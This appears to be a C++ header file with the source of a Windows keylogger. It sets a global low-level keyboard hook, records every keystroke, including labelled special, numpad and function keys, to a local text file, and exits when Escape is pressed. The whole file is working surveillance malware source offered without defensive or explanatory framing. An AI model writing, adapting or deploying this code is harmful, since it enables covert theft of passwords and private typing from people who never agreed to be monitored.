#pragma once
#pragma warning(disable : 4996)
#define PATH "KeyLogger_OUTFILE.txt" // path to keylogger OUTPUT file location
#include <Windows.h>
#include <fstream>
LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam); // keyboard hook production
HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, NULL, NULL);

bool saveToFile(DWORD key)
{
	FILE* OUTPUT_FILE = fopen(PATH, "a+");
	if (OUTPUT_FILE == NULL)
		return false;
	switch (key)
	{
	case VK_ESCAPE:
		UnhookWindowsHookEx(keyboardHook);
		fprintf(OUTPUT_FILE, "%s", "\nEXIT PRESSED\n");
		fclose(OUTPUT_FILE);
		exit(1);
	case VK_TAB: // ### SHIFT KEYS
		fprintf(OUTPUT_FILE, "%s", " [TAB]");
		break;
	case VK_SPACE:
		fprintf(OUTPUT_FILE, "%s", " [SPACE]");
		break;
	case VK_RETURN:
		fprintf(OUTPUT_FILE, "%s", " [ENTER]");
		break;
	case VK_BACK:
		fprintf(OUTPUT_FILE, "%s", " [BACKSPACE]");
		break;
	case VK_DELETE:
		fprintf(OUTPUT_FILE, "%s", " [DELETE]");
		break;
	case VK_MENU:
		fprintf(OUTPUT_FILE, "%s", " [ALT]");
		break;
	case VK_LCONTROL:
		fprintf(OUTPUT_FILE, "%s", " [LEFT CONTROL]");
		break;
	case VK_RCONTROL:
		fprintf(OUTPUT_FILE, "%s", " [RIGHT CONTROL]");
		break;
	case VK_LSHIFT:
		fprintf(OUTPUT_FILE, "%s", " [LEFT SHIFT]");
		break;
	case VK_RSHIFT:
		fprintf(OUTPUT_FILE, "%s", " [RIGHT SHIFT]");
		break;
	case VK_CAPITAL:
		fprintf(OUTPUT_FILE, "%s", " [CAPS LOCK]");
		break;
	case VK_NUMPAD0: // ### NUMPAD KEYS
		fprintf(OUTPUT_FILE, "%s", " [NUMPAD 0]");
		break;
	case VK_NUMPAD1:
		fprintf(OUTPUT_FILE, "%s", " [NUMPAD 1]");
		break;
	case VK_NUMPAD2:
		fprintf(OUTPUT_FILE, "%s", " [NUMPAD 2]");
		break;
	case VK_NUMPAD3:
		fprintf(OUTPUT_FILE, "%s", " [NUMPAD 3]");
		break;
	case VK_NUMPAD4:
		fprintf(OUTPUT_FILE, "%s", " [NUMPAD 4]");
		break;
	case VK_NUMPAD5:
		fprintf(OUTPUT_FILE, "%s", " [NUMPAD 5]");
		break;
	case VK_NUMPAD6:
		fprintf(OUTPUT_FILE, "%s", " [NUMPAD 6]");
		break;
	case VK_NUMPAD7:
		fprintf(OUTPUT_FILE, "%s", " [NUMPAD 7]");
		break;
	case VK_NUMPAD8:
		fprintf(OUTPUT_FILE, "%s", " [NUMPAD 8]");
		break;
	case VK_NUMPAD9:
		fprintf(OUTPUT_FILE, "%s", " [NUMPAD 9]");
		break;
	case VK_F1: //  ### FUNCTION KEYS
		fprintf(OUTPUT_FILE, "%s", " [F1]");
		break;
	case VK_F2:
		fprintf(OUTPUT_FILE, "%s", " [F2]");
		break;
	case VK_F3:
		fprintf(OUTPUT_FILE, "%s", " [F3]");
		break;
	case VK_F4:
		fprintf(OUTPUT_FILE, "%s", " [F4]");
		break;
	case VK_F5:
		fprintf(OUTPUT_FILE, "%s", " [F5]");
		break;
	case VK_F6:
		fprintf(OUTPUT_FILE, "%s", " [F6]");
		break;
	case VK_F7:
		fprintf(OUTPUT_FILE, "%s", " [F7]");
		break;
	case VK_F8:
		fprintf(OUTPUT_FILE, "%s", " [F8]");
		break;
	case VK_F9:
		fprintf(OUTPUT_FILE, "%s", " [F9]");
		break;
	case VK_F10:
		fprintf(OUTPUT_FILE, "%s", " [F10]");
		break;
	case VK_F11:
		fprintf(OUTPUT_FILE, "%s", " [F11]");
		break;
	case VK_F12:
		fprintf(OUTPUT_FILE, "%s", " [F12]");
		break;
	default:
		if ((GetKeyState(VK_CAPITAL) & 0x0001) == 0) // to check if the key is an uppercase letter
			key = tolower(key);
		fprintf(OUTPUT_FILE, "%s", &key);
		break;
	}
	fclose(OUTPUT_FILE);
	return true;
}

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	// PKBDLLHOOKSTRUCT or KBDLLHOOKSTRUCT - structure that contains low-level keyboard input
	// wParam - key type
	// lParam - type of PKBDLLHOOKSTRUCT
	// nCode - represented as 0 or HC_ACTION if a key was pressed, otherwise any number below 0
	PKBDLLHOOKSTRUCT kbs = (PKBDLLHOOKSTRUCT)lParam;
	if (wParam == WM_KEYDOWN && nCode == HC_ACTION)
		saveToFile(kbs->vkCode);
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}
